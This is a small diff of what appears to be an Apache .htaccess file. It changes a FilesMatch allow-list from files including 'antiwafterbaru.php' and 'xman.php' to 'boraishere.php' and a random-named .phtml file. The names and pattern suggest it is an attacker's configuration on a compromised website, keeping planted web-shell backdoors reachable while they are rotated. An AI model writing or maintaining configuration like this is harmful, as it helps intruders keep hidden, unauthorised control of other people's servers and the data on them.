@@ -1,6 +1,6 @@
 Options -Indexes
 
-<FilesMatch "^(index.php|67a34bd052c25.shtml|antiwafterbaru.php|xman.php)$">
+<FilesMatch "^(boraishere.php|67a6e79fe848e.phtml)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
